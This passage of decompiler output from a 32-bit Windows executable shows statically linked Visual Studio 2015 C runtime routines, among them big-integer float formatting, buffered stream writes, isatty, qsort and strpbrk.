                        puVar19 = *ppuVar17;
                        *ppuVar17 = (uint *)((int)*ppuVar17 + uVar21);
                        uVar10 = (int)((ulonglong)lVar25 >> 0x20) + (uint)CARRY4(uVar23,uVar10) +
                                 (uint)CARRY4((uint)puVar19,uVar21);
                        local_760 = (uint **)((int)local_760 + 1);
                        ppuVar16 = (uint **)((int)ppuVar16 + 1);
                        local_1d8 = ppuStack1864;
                      } while (local_760 != ppuStack1892);
                      do {
                        if (uVar10 == 0) break;
                        if (ppuVar16 == (uint **)0x73) goto LAB_0040f6c4;
                        if (ppuVar16 == local_1d8) {
                          apuStack1860[(int)ppuVar16] = (uint *)0x0;
                          ppuStack1864 = (uint **)((int)ppuVar16 + 1);
                        }
                        ppuVar17 = apuStack1860 + (int)ppuVar16;
                        puVar19 = *ppuVar17;
                        *ppuVar17 = (uint *)((int)*ppuVar17 + uVar10);
                        uVar10 = (uint)CARRY4((uint)puVar19,uVar10);
                        ppuVar16 = (uint **)((int)ppuVar16 + 1);
                        local_1d8 = ppuStack1864;
                      } while( true );
                    }
                    if (ppuVar16 == (uint **)0x73) goto LAB_0040f6c4;
                  }
                  ppuVar14 = (uint **)((int)ppuVar14 + 1);
                } while (ppuVar14 != local_754);
              }
              rVar8 = (int)local_1d8 << 2;
              ppuVar16 = apuStack1860;
LAB_0040f615:
              _memcpy_s(local_1d4,0x1cc,ppuVar16,rVar8);
LAB_0040f626:
              bVar4 = true;
            }
            if (!bVar4) goto LAB_0040f712;
          }
          if (ppuStack1884 != (uint **)0x0) {
            uVar11 = *(uint *)(&DAT_00418a4c + (int)ppuStack1884 * 4);
            local_76c = local_76c & 0xffffffff | (ulonglong)uVar11 << 0x20;
            if (uVar11 == 0) {
LAB_0040f712:
              local_1d8 = (uint **)0x0;
              ppuVar16 = local_1d4;
              goto LAB_0040f71f;
            }
            if ((uVar11 != 1) && (local_1d8 != (uint **)0x0)) {
              puVar19 = (uint *)0x0;
              ppuVar16 = (uint **)0x0;
              do {
                puVar12 = local_1d4[(int)ppuVar16];
                uVar10 = (uint)((ulonglong)uVar11 * ZEXT48(puVar12));
                local_1d4[(int)ppuVar16] = (uint *)(uVar10 + (int)puVar19);
                puVar19 = (uint *)((int)((ulonglong)uVar11 * ZEXT48(puVar12) >> 0x20) +
                                  (uint)CARRY4(uVar10,(uint)puVar19));
                ppuVar16 = (uint **)((int)ppuVar16 + 1);
              } while (ppuVar16 != local_1d8);
              if (puVar19 != (uint *)0x0) {
                if ((uint **)0x72 < local_1d8) goto LAB_0040f712;
                local_1d4[(int)local_1d8] = puVar19;
                local_1d8 = (uint **)((int)local_1d8 + 1);
              }
            }
          }
        }
        else {
          local_774 = (uint **)(local_770 / 10);
          local_76c._4_4_ = local_770 % 10;
          local_76c = local_76c & 0xffffffff | (ulonglong)local_76c._4_4_ << 0x20;
          if (local_774 != (uint **)0x0) {
            do {
              local_760 = local_774;
              if ((uint **)0x26 < local_774) {
                local_760 = (uint **)0x26;
              }
              uVar11 = (uint)(byte)(&DAT_004189b6)[(int)local_760 * 4];
              bVar13 = (&DAT_004189b7)[(int)local_760 * 4];
              local_578 = (uint **)(uVar11 + bVar13);
              _memset(local_574,0,uVar11 * 4);
              FID_conflict__memcpy
                        (local_574 + uVar11,
                         &DAT_004180b0 + (uint)*(ushort *)(&DAT_004189b4 + (int)local_760 * 4) * 4,
                         (uint)bVar13 << 2);
              puVar19 = apuStack932[0];
              ppuStack1892 = local_578;
              if (local_578 < (uint **)0x2) {
                if (local_574[0] == (uint *)0x0) {
                  rVar8 = 0;
                  ppuStack1864 = (uint **)0x0;
                  ppuStack936 = (uint **)0x0;
LAB_0040f1d2:
                  ppuVar16 = apuStack1860;
                  goto LAB_0040f1d9;
                }
                if ((local_574[0] == (uint *)0x1) || (ppuStack936 == (uint **)0x0))
                goto LAB_0040f1ea;
                puVar12 = (uint *)0x0;
                ppuVar16 = (uint **)0x0;
                do {
                  puVar19 = apuStack932[(int)ppuVar16];
                  uVar11 = (uint)(ZEXT48(local_574[0]) * ZEXT48(puVar19));
                  apuStack932[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar12);
                  puVar12 = (uint *)((int)(ZEXT48(local_574[0]) * ZEXT48(puVar19) >> 0x20) +
                                    (uint)CARRY4(uVar11,(uint)puVar12));
                  ppuVar16 = (uint **)((int)ppuVar16 + 1);
                } while (ppuVar16 != ppuStack936);
LAB_0040f02a:
                ppuStack1884 = ppuStack936;
                if (puVar12 == (uint *)0x0) goto LAB_0040f1ea;
                if (ppuStack936 < (uint **)0x73) {
                  apuStack932[(int)ppuStack936] = puVar12;
                  ppuStack936 = (uint **)((int)ppuStack936 + 1);
                  goto LAB_0040f1ea;
                }
                local_578 = (uint **)0x0;
                ppuVar16 = local_574;
LAB_0040f247:
                ppuStack936 = (uint **)0x0;
                _memcpy_s(apuStack932,0x1cc,ppuVar16,0);
                bVar4 = false;
              }
              else {
                if ((uint **)0x1 < ppuStack936) {
                  ppuVar16 = local_574;
                  if (local_578 < ppuStack936) {
                    local_754 = apuStack932;
                    ppuStack1892 = ppuStack936;
                    ppuStack1880 = local_578;
                  }
                  else {
                    ppuVar16 = apuStack932;
                    local_754 = local_574;
                    ppuStack1880 = ppuStack936;
                  }
                  ppuStack936 = (uint **)0x0;
                  ppuVar14 = (uint **)0x0;
                  ppuStack1864 = (uint **)0x0;
                  if (ppuStack1880 != (uint **)0x0) {
                    local_788 = (int)ppuVar16 - (int)apuStack1860;
                    do {
                      ppuStack1884 = *(uint ***)((int)apuStack1860 + local_788 + (int)ppuVar14 * 4);
                      if (ppuStack1884 == (uint **)0x0) {
                        if (ppuVar14 == ppuStack936) {
                          apuStack1860[(int)ppuVar14] = (uint *)0x0;
                          ppuStack936 = (uint **)((int)ppuVar14 + 1);
                          ppuStack1864 = ppuStack936;
                        }
                      }
                      else {
                        uVar11 = 0;
                        local_750 = (uint **)0x0;
                        ppuVar16 = ppuVar14;
                        if (ppuStack1892 != (uint **)0x0) {
                          do {
                            if (ppuVar16 == (uint **)0x73) break;
                            if (ppuVar16 == ppuStack936) {
                              apuStack1860[(int)ppuVar16] = (uint *)0x0;
                              ppuStack1864 = (uint **)((int)local_750 + 1U + (int)ppuVar14);
                            }
                            puVar19 = local_754[(int)local_750];
                            uVar10 = (uint)(ZEXT48(puVar19) * ZEXT48(ppuStack1884));
                            uVar23 = uVar10 + uVar11;
                            ppuVar17 = apuStack1860 + (int)ppuVar16;
                            puVar12 = *ppuVar17;
                            *ppuVar17 = (uint *)((int)*ppuVar17 + uVar23);
                            uVar11 = (int)(ZEXT48(puVar19) * ZEXT48(ppuStack1884) >> 0x20) +
                                     (uint)CARRY4(uVar10,uVar11) +
                                     (uint)CARRY4((uint)puVar12,uVar23);
                            local_750 = (uint **)((int)local_750 + 1);
                            ppuVar16 = (uint **)((int)ppuVar16 + 1);
                            ppuStack936 = ppuStack1864;
                          } while (local_750 != ppuStack1892);
                          do {
                            if (uVar11 == 0) break;
                            if (ppuVar16 == (uint **)0x73) goto LAB_0040f232;
                            if (ppuVar16 == ppuStack936) {
                              apuStack1860[(int)ppuVar16] = (uint *)0x0;
                              ppuStack1864 = (uint **)((int)ppuVar16 + 1);
                            }
                            ppuVar17 = apuStack1860 + (int)ppuVar16;
                            puVar19 = *ppuVar17;
                            *ppuVar17 = (uint *)((int)*ppuVar17 + uVar11);
                            uVar11 = (uint)CARRY4((uint)puVar19,uVar11);
                            ppuVar16 = (uint **)((int)ppuVar16 + 1);
                            ppuStack936 = ppuStack1864;
                          } while( true );
                        }
                        if (ppuVar16 == (uint **)0x73) {
LAB_0040f232:
                          in_stack_fffff698 = 0;
                          ppuVar16 = apuStack2404;
                          goto LAB_0040f247;
                        }
                      }
                      ppuVar14 = (uint **)((int)ppuVar14 + 1);
                    } while (ppuVar14 != ppuStack1880);
                  }
                  rVar8 = (int)ppuStack936 << 2;
                  goto LAB_0040f1d2;
                }
                ppuStack936 = local_578;
                _memcpy_s(apuStack932,0x1cc,local_574,(int)local_578 << 2);
                if (puVar19 != (uint *)0x0) {
                  if ((puVar19 != (uint *)0x1) && (ppuStack936 != (uint **)0x0)) {
                    puVar12 = (uint *)0x0;
                    ppuVar16 = (uint **)0x0;
                    do {
                      puVar1 = apuStack932[(int)ppuVar16];
                      uVar11 = (uint)(ZEXT48(puVar19) * ZEXT48(puVar1));
                      apuStack932[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar12);
                      puVar12 = (uint *)((int)(ZEXT48(puVar19) * ZEXT48(puVar1) >> 0x20) +
                                        (uint)CARRY4(uVar11,(uint)puVar12));
                      ppuVar16 = (uint **)((int)ppuVar16 + 1);
                    } while (ppuVar16 != ppuStack936);
                    goto LAB_0040f02a;
                  }
                  goto LAB_0040f1ea;
                }
                local_578 = (uint **)0x0;
                ppuStack936 = (uint **)0x0;
                rVar8 = 0;
                ppuVar16 = local_574;
LAB_0040f1d9:
                _memcpy_s(apuStack932,0x1cc,ppuVar16,rVar8);
LAB_0040f1ea:
                bVar4 = true;
              }
              if (!bVar4) goto LAB_0040f26c;
              local_774 = (uint **)((int)local_774 - (int)local_760);
            } while (local_774 != (uint **)0x0);
          }
          if (local_76c._4_4_ != 0) {
            uVar11 = *(uint *)(&DAT_00418a4c + local_76c._4_4_ * 4);
            if (uVar11 == 0) {
LAB_0040f26c:
              ppuStack936 = (uint **)0x0;
              ppuVar16 = apuStack932;
LAB_0040f71f:
              in_stack_fffff698 = 0;
              _memcpy_s(ppuVar16,0x1cc,apuStack2404,0);
            }
            else if ((uVar11 != 1) &&
                    (local_76c = local_76c & 0xffffffff | ZEXT48(ppuStack936) << 0x20,
                    ppuStack936 != (uint **)0x0)) {
              puVar19 = (uint *)0x0;
              ppuVar16 = (uint **)0x0;
              do {
                puVar12 = apuStack932[(int)ppuVar16];
                uVar10 = (uint)((ulonglong)uVar11 * ZEXT48(puVar12));
                apuStack932[(int)ppuVar16] = (uint *)(uVar10 + (int)puVar19);
                puVar19 = (uint *)((int)((ulonglong)uVar11 * ZEXT48(puVar12) >> 0x20) +
                                  (uint)CARRY4(uVar10,(uint)puVar19));
                ppuVar16 = (uint **)((int)ppuVar16 + 1);
              } while (ppuVar16 != ppuStack936);
              if (puVar19 != (uint *)0x0) {
                if ((uint **)0x72 < ppuStack936) goto LAB_0040f26c;
                apuStack932[(int)ppuStack936] = puVar19;
                ppuStack936 = (uint **)((int)ppuStack936 + 1);
              }
            }
          }
        }
        pcVar20 = local_780;
        local_750 = (uint **)local_780;
        if (local_1d8 != (uint **)0x0) {
          puVar19 = (uint *)0x0;
          ppuVar16 = (uint **)0x0;
          do {
            puVar12 = local_1d4[(int)ppuVar16];
            uVar11 = (uint)(ZEXT48(puVar12) * 10);
            local_1d4[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar19);
            puVar19 = (uint *)((int)(ZEXT48(puVar12) * 10 >> 0x20) +
                              (uint)CARRY4(uVar11,(uint)puVar19));
            ppuVar16 = (uint **)((int)ppuVar16 + 1);
          } while (ppuVar16 != local_1d8);
          local_76c = local_76c & 0xffffffff | ZEXT48(puVar19) << 0x20;
          if (puVar19 != (uint *)0x0) {
            if (local_1d8 < (uint **)0x73) {
              local_1d4[(int)local_1d8] = puVar19;
              local_1d8 = (uint **)((int)local_1d8 + 1);
            }
            else {
              in_stack_fffff698 = 0;
              local_1d8 = (uint **)0x0;
              _memcpy_s(local_1d4,0x1cc,apuStack2404,0);
            }
          }
        }
        _Var26 = __crt_strtox::divide((big_integer *)&local_1d8,(big_integer *)&ppuStack936);
        uVar10 = 10;
        uVar11 = 10;
        if ((int)_Var26 == 10) {
          local_770 = local_770 + 1;
          local_750 = (uint **)(pcVar20 + 1);
          *pcVar20 = '1';
          uVar11 = uVar10;
          if (ppuStack936 != (uint **)0x0) {
            puVar19 = (uint *)0x0;
            ppuVar16 = (uint **)0x0;
            do {
              puVar12 = apuStack932[(int)ppuVar16];
              uVar11 = (uint)(ZEXT48(puVar12) * 10);
              apuStack932[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar19);
              puVar19 = (uint *)((int)(ZEXT48(puVar12) * 10 >> 0x20) +
                                (uint)CARRY4(uVar11,(uint)puVar19));
              ppuVar16 = (uint **)((int)ppuVar16 + 1);
              uVar11 = 10;
            } while (ppuVar16 != ppuStack936);
            if (puVar19 != (uint *)0x0) {
              if (ppuStack936 < (uint **)0x73) {
                apuStack932[(int)ppuStack936] = puVar19;
                ppuStack936 = (uint **)((int)ppuStack936 + 1);
              }
              else {
                in_stack_fffff698 = 0;
                ppuStack936 = (uint **)0x0;
                _memcpy_s(apuStack932,0x1cc,apuStack2404,0);
                uVar11 = extraout_EDX_00;
              }
            }
          }
LAB_0040f883:
          pcVar20 = pcVar20 + 1;
          uVar23 = local_770;
          uVar10 = uVar11;
        }
        else {
          if ((int)_Var26 != 0) {
            local_750 = (uint **)(pcVar20 + 1);
            *pcVar20 = (char)_Var26 + '0';
            goto LAB_0040f883;
          }
          uVar23 = local_770 - 1;
        }
        uVar30 = (undefined)in_stack_fffff698;
        bVar13 = (byte)uVar10;
        local_784[1] = uVar23;
        if ((-1 < (int)uVar23) && (local_77c < 0x80000000)) {
          local_77c = (char *)((int)local_77c + uVar23);
        }
        uVar11 = param_6 - 1;
        if (local_77c <= param_6 - 1) {
          uVar11 = (uint)local_77c;
        }
        local_77c = local_780 + uVar11;
        if (pcVar20 != local_77c) {
          do {
            pcVar29 = (char *)local_750;
            uVar30 = (undefined)in_stack_fffff698;
            bVar13 = (byte)uVar10;
            if (local_1d8 == (uint **)0x0) break;
            puVar19 = (uint *)0x0;
            ppuVar16 = (uint **)0x0;
            do {
              puVar12 = local_1d4[(int)ppuVar16];
              uVar11 = (uint)(ZEXT48(puVar12) * 1000000000);
              local_1d4[(int)ppuVar16] = (uint *)(uVar11 + (int)puVar19);
              puVar19 = (uint *)((int)(ZEXT48(puVar12) * 1000000000 >> 0x20) +
                                (uint)CARRY4(uVar11,(uint)puVar19));
              ppuVar16 = (uint **)((int)ppuVar16 + 1);
            } while (ppuVar16 != local_1d8);
            if (puVar19 != (uint *)0x0) {
              if (local_1d8 < (uint **)0x73) {
                local_1d4[(int)local_1d8] = puVar19;
                local_1d8 = (uint **)((int)local_1d8 + 1);
              }
              else {
                in_stack_fffff698 = 0;
                local_1d8 = (uint **)0x0;
                _memcpy_s(local_1d4,0x1cc,apuStack2404,0);
              }
            }
            uVar27 = __crt_strtox::divide((big_integer *)&local_1d8,(big_integer *)&ppuStack936);
            uVar30 = (undefined)in_stack_fffff698;
            uVar23 = 8;
            uVar11 = (int)local_77c - (int)pcVar29;
            do {
              uVar2 = uVar27 & 0xffffffff;
              uVar27 = uVar2 / uStack1912;
              bVar13 = (char)(uVar2 % (ulonglong)uStack1912) + 0x30;
              uVar10 = (uint)bVar13;
              if (uVar23 <= uVar11) {
                pcVar29[uVar23] = bVar13;
              }
              uVar23 = uVar23 - 1;
            } while (uVar23 != 0xffffffff);
            if (9 < uVar11) {
              uVar11 = 9;
            }
            pcVar20 = pcVar29 + uVar11;
            local_750 = (uint **)pcVar20;
          } while (pcVar20 != local_77c);
        }
        *pcVar20 = '\0';
        goto LAB_0040f9c6;
      }
      pcVar29 = "1#IND";
    }
  }
  eVar9 = _strcpy_s(pcVar20,param_6,pcVar29);
  bVar13 = extraout_DL;
  if (eVar9 != 0) {
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
LAB_0040f9c6:
  if (local_790 != '\0') {
    _fesetenv(local_798);
    bVar13 = extraout_DL_00;
  }
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,bVar13,uVar30);
  return;
}



// Library Function - Single Match
//  bool __cdecl write_buffer_nolock<char>(char,class __crt_stdio_stream)
// 
// Library: Visual Studio 2015 Release

bool __cdecl write_buffer_nolock_char_(char param_1,__crt_stdio_stream param_2)

{
  uint _FileHandle;
  undefined *puVar1;
  int iVar2;
  uint _MaxCharCount;
  uint uVar3;
  char cVar4;
  longlong lVar5;
  undefined3 in_stack_00000009;
  
  _FileHandle = __fileno(_param_2);
  if ((_param_2->_flag & 0xc0U) == 0) {
    iVar2 = __write(_FileHandle,&param_1,1);
    cVar4 = '\x01' - (iVar2 != 1);
  }
  else {
    uVar3 = 0;
    _MaxCharCount = (int)_param_2->_ptr - _param_2->_cnt;
    _param_2->_ptr = (char *)(_param_2->_cnt + 1);
    _param_2->_base = (char *)(_param_2->_bufsiz + -1);
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar1 = &DAT_0041b0f8;
      }
      else {
        puVar1 = (undefined *)((_FileHandle & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)_FileHandle >> 6])
        ;
      }
      if (((puVar1[0x28] & 0x20) != 0) && (lVar5 = __lseeki64(_FileHandle,0,2), lVar5 == -1)) {
        LOCK();
        _param_2->_flag = _param_2->_flag | 0x10;
        return true;
      }
    }
    else {
      uVar3 = __write(_FileHandle,(void *)_param_2->_cnt,_MaxCharCount);
    }
    *(char *)_param_2->_cnt = param_1;
    cVar4 = uVar3 == _MaxCharCount;
  }
  return (bool)cVar4;
}



// Library Function - Single Match
//  ___acrt_stdio_flush_and_write_narrow_nolock
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___acrt_stdio_flush_and_write_narrow_nolock(byte param_1,FILE *param_2)

{
  bool bVar1;
  int iVar2;
  int *piVar3;
  FILE *pFVar4;
  
  iVar2 = __fileno(param_2);
  if ((param_2->_flag & 6U) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
  }
  else {
    if (((uint)param_2->_flag >> 0xc & 1) == 0) {
      if ((param_2->_flag & 1U) != 0) {
        param_2->_base = (char *)0x0;
        if (((uint)param_2->_flag >> 3 & 1) == 0) goto LAB_0040fa24;
        param_2->_ptr = (char *)param_2->_cnt;
        LOCK();
        param_2->_flag = param_2->_flag & 0xfffffffe;
      }
      LOCK();
      param_2->_flag = param_2->_flag | 2;
      LOCK();
      param_2->_flag = param_2->_flag & 0xfffffff7;
      param_2->_base = (char *)0x0;
      if (((param_2->_flag & 0x4c0U) == 0) &&
         (((pFVar4 = (FILE *)___acrt_iob_func(1), param_2 != pFVar4 &&
           (pFVar4 = (FILE *)___acrt_iob_func(2), param_2 != pFVar4)) ||
          (iVar2 = __isatty(iVar2), iVar2 == 0)))) {
        ___acrt_stdio_allocate_buffer_nolock(&param_2->_ptr);
      }
      bVar1 = write_buffer_nolock_char_(param_1,SUB41(param_2,0));
      if (!bVar1) {
        LOCK();
        param_2->_flag = param_2->_flag | 0x10;
        return 0xffffffff;
      }
      return (uint)param_1;
    }
    piVar3 = __errno();
    *piVar3 = 0x22;
  }
LAB_0040fa24:
  LOCK();
  param_2->_flag = param_2->_flag | 0x10;
  return 0xffffffff;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2015 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041c1c8)) {
      return *(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3fU) * 0x30) &
             0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004091be();
  }
  return 0;
}



// Library Function - Single Match
//  void __cdecl shortsort(char *,char *,unsigned int,int (__cdecl*)(void const *,void const *))
// 
// Library: Visual Studio 2015 Release

void __cdecl shortsort(char *param_1,char *param_2,uint param_3,FuncDef17 *param_4)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  char in_DL;
  char *pcVar4;
  uint uVar5;
  char *pcVar6;
  char *pcVar7;
  char *pcVar8;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (param_1 < param_2) {
    do {
      pcVar6 = param_1;
      for (pcVar4 = param_1 + param_3; pcVar4 <= param_2; pcVar4 = pcVar4 + param_3) {
        pcVar7 = pcVar4;
        pcVar8 = pcVar6;
        _guard_check_icall();
        iVar3 = (*param_4)(pcVar7,pcVar8);
        if (0 < iVar3) {
          pcVar6 = pcVar4;
        }
      }
      if ((pcVar6 != param_2) && (pcVar4 = param_2, uVar5 = param_3, param_3 != 0)) {
        do {
          pcVar7 = pcVar4 + 1;
          cVar1 = pcVar7[(int)(pcVar6 + (-1 - (int)param_2))];
          pcVar7[(int)(pcVar6 + (-1 - (int)param_2))] = *pcVar4;
          *pcVar4 = cVar1;
          uVar5 = uVar5 - 1;
          pcVar4 = pcVar7;
        } while (uVar5 != 0);
      }
      param_2 = param_2 + -param_3;
      in_DL = (char)param_1 + (char)param_3;
    } while (param_1 < param_2);
  }
  FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar2);
  return;
}



// Library Function - Single Match
//  void __cdecl swap(char *,char *,unsigned int)
// 
// Library: Visual Studio 2015 Release

void __cdecl swap(char *param_1,char *param_2,uint param_3)

{
  char *pcVar1;
  char cVar2;
  char *pcVar3;
  
  if ((param_1 != param_2) && (pcVar3 = param_2, param_3 != 0)) {
    do {
      pcVar1 = pcVar3 + 1;
      cVar2 = pcVar1[(int)(param_1 + (-1 - (int)param_2))];
      pcVar1[(int)(param_1 + (-1 - (int)param_2))] = *pcVar3;
      *pcVar3 = cVar2;
      param_3 = param_3 - 1;
      pcVar3 = pcVar1;
    } while (param_3 != 0);
  }
  return;
}



// Library Function - Single Match
//  _qsort
// 
// Library: Visual Studio 2015 Release

void __cdecl
_qsort(void *_Base,size_t _NumOfElements,size_t _SizeOfElements,_PtFuncCompare *_PtFuncCompare)

{
  uint uVar1;
  char cVar2;
  int *piVar3;
  int iVar4;
  undefined extraout_DL;
  char *extraout_EDX;
  char *pcVar5;
  char *pcVar6;
  size_t sVar7;
  char *pcVar8;
  undefined uVar9;
  char *in_stack_fffffee0;
  char *local_118;
  char *local_114;
  char *local_110;
  int local_10c;
  char *local_108;
  char *apcStack248 [30];
  char *apcStack128 [30];
  uint local_8;
  
  uVar9 = SUB41(in_stack_fffffee0,0);
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_108 = (char *)_Base;
  if ((((_Base == (void *)0x0) && (_NumOfElements != 0)) || (_SizeOfElements == 0)) ||
     (_PtFuncCompare == (_PtFuncCompare *)0x0)) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004091be();
    FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,extraout_DL,uVar9);
    return;
  }
  local_10c = 0;
  if (_NumOfElements < 2) {
LAB_004100aa:
    FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,(char)_NumOfElements,uVar9);
    return;
  }
  local_118 = (char *)((_NumOfElements - 1) * _SizeOfElements + (int)_Base);
LAB_0040fda5:
  while (_NumOfElements = (size_t)local_118,
        uVar1 = (_NumOfElements - (int)local_108) / _SizeOfElements + 1, 8 < uVar1) {
    pcVar6 = local_108 + (uVar1 >> 1) * _SizeOfElements;
    pcVar5 = local_108;
    pcVar8 = pcVar6;
    _guard_check_icall();
    iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
    if (0 < iVar4) {
      swap(local_108,pcVar6,_SizeOfElements);
    }
    pcVar5 = local_108;
    pcVar8 = (char *)_NumOfElements;
    _guard_check_icall();
    iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
    if (0 < iVar4) {
      swap(local_108,(char *)_NumOfElements,_SizeOfElements);
    }
    pcVar5 = pcVar6;
    pcVar8 = (char *)_NumOfElements;
    _guard_check_icall();
    iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
    local_110 = local_108;
    local_118 = (char *)_NumOfElements;
    local_114 = pcVar6;
    if (0 < iVar4) {
      swap(pcVar6,(char *)_NumOfElements,_SizeOfElements);
    }
LAB_0040fe70:
    if (local_110 < pcVar6) {
      do {
        local_110 = local_110 + _SizeOfElements;
        if (pcVar6 <= local_110) goto LAB_0040feb1;
        pcVar5 = local_110;
        pcVar8 = pcVar6;
        _guard_check_icall();
        iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
      } while (iVar4 < 1);
      if (pcVar6 <= local_110) goto LAB_0040feb1;
    }
    else {
LAB_0040feb1:
      do {
        local_110 = local_110 + _SizeOfElements;
        if (_NumOfElements < local_110) break;
        pcVar5 = local_110;
        pcVar8 = pcVar6;
        _guard_check_icall();
        iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
      } while (iVar4 < 1);
    }
    do {
      local_118 = local_118 + -_SizeOfElements;
      if (local_118 <= pcVar6) break;
      pcVar5 = local_118;
      pcVar8 = pcVar6;
      _guard_check_icall();
      iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
    } while (0 < iVar4);
    if (local_110 <= local_118) {
      pcVar5 = local_118;
      sVar7 = _SizeOfElements;
      if (local_110 != local_118) {
        do {
          pcVar6 = pcVar5 + 1;
          cVar2 = pcVar6[(int)(local_110 + (-1 - (int)local_118))];
          pcVar6[(int)(local_110 + (-1 - (int)local_118))] = *pcVar5;
          *pcVar5 = cVar2;
          sVar7 = sVar7 - 1;
          pcVar5 = pcVar6;
          pcVar6 = local_114;
        } while (sVar7 != 0);
      }
      in_stack_fffffee0 = local_118;
      if (pcVar6 == local_118) {
        local_114 = local_110;
        pcVar6 = local_110;
      }
      goto LAB_0040fe70;
    }
    local_118 = local_118 + _SizeOfElements;
    if (pcVar6 < local_118) {
      do {
        local_118 = local_118 + -_SizeOfElements;
        if (local_118 <= pcVar6) goto LAB_0040ffc1;
        pcVar5 = local_118;
        pcVar8 = pcVar6;
        _guard_check_icall();
        iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
      } while (iVar4 == 0);
      if (local_118 <= pcVar6) goto LAB_0040ffc1;
    }
    else {
LAB_0040ffc1:
      do {
        local_118 = local_118 + -_SizeOfElements;
        if (local_118 <= local_108) break;
        pcVar5 = local_118;
        pcVar8 = pcVar6;
        _guard_check_icall();
        iVar4 = (*_PtFuncCompare)(pcVar5,pcVar8);
      } while (iVar4 == 0);
    }
    if ((int)local_118 - (int)local_108 < (int)(_NumOfElements - (int)local_110)) goto LAB_0041003b;
    if (local_108 < local_118) {
      apcStack248[local_10c] = local_108;
      apcStack128[local_10c] = local_118;
      local_10c = local_10c + 1;
    }
    local_108 = local_110;
    local_118 = (char *)_NumOfElements;
    if (_NumOfElements <= local_110) goto LAB_00410082;
  }
  shortsort(local_108,(char *)_NumOfElements,_SizeOfElements,(FuncDef17 *)_PtFuncCompare);
  _NumOfElements = (size_t)extraout_EDX;
  goto LAB_00410082;
LAB_0041003b:
  if (local_110 < _NumOfElements) {
    apcStack248[local_10c] = local_110;
    apcStack128[local_10c] = (char *)_NumOfElements;
    local_10c = local_10c + 1;
  }
  if (local_118 <= local_108) {
LAB_00410082:
    uVar9 = SUB41(in_stack_fffffee0,0);
    local_10c = local_10c + -1;
    if (-1 < local_10c) {
      local_108 = apcStack248[local_10c];
      local_118 = apcStack128[local_10c];
      goto LAB_0040fda5;
    }
    goto LAB_004100aa;
  }
  goto LAB_0040fda5;
}



int __cdecl FUN_004100ba(char *param_1,int param_2,int param_3,int param_4)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  
  if (param_4 == 0) {
    if (param_1 == (char *)0x0) {
      if (param_2 == 0) {
        return 0;
      }
    }
    else {
LAB_004100dc:
      if (param_2 != 0) {
        if (param_4 == 0) {
          *param_1 = '\0';
          return 0;
        }
        if (param_3 != 0) {
          iVar5 = param_4;
          iVar3 = param_2;
          pcVar4 = param_1;
          if (param_4 == -1) {
            do {
              cVar1 = pcVar4[param_3 - (int)param_1];
              *pcVar4 = cVar1;
              pcVar4 = pcVar4 + 1;
              if (cVar1 == '\0') break;
              iVar3 = iVar3 + -1;
            } while (iVar3 != 0);
          }
          else {
            do {
              cVar1 = pcVar4[param_3 - (int)param_1];
              *pcVar4 = cVar1;
              pcVar4 = pcVar4 + 1;
              if ((cVar1 == '\0') || (iVar3 = iVar3 + -1, iVar3 == 0)) break;
              iVar5 = iVar5 + -1;
            } while (iVar5 != 0);
            if (iVar5 == 0) {
              *pcVar4 = '\0';
            }
          }
          if (iVar3 != 0) {
            return 0;
          }
          if (param_4 == -1) {
            param_1[param_2 + -1] = '\0';
            return 0x50;
          }
          *param_1 = '\0';
          piVar2 = __errno();
          iVar5 = 0x22;
          goto LAB_004100fc;
        }
        *param_1 = '\0';
      }
    }
  }
  else if (param_1 != (char *)0x0) goto LAB_004100dc;
  piVar2 = __errno();
  iVar5 = 0x16;
LAB_004100fc:
  *piVar2 = iVar5;
  FUN_004091be();
  return iVar5;
}



void __cdecl FUN_0041016b(char *param_1,int param_2,int param_3,int param_4)

{
  FUN_004100ba(param_1,param_2,param_3,param_4);
  return;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  char *pcVar2;
  byte *pbVar3;
  undefined4 uStack40;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uStack12 = 0;
  uStack16 = 0;
  uStack20 = 0;
  uStack24 = 0;
  uStack28 = 0;
  uStack32 = 0;
  uStack36 = 0;
  uStack40 = 0;
  for (; bVar1 = *_Control, bVar1 != 0; _Control = (char *)((byte *)_Control + 1)) {
    pbVar3 = (byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3));
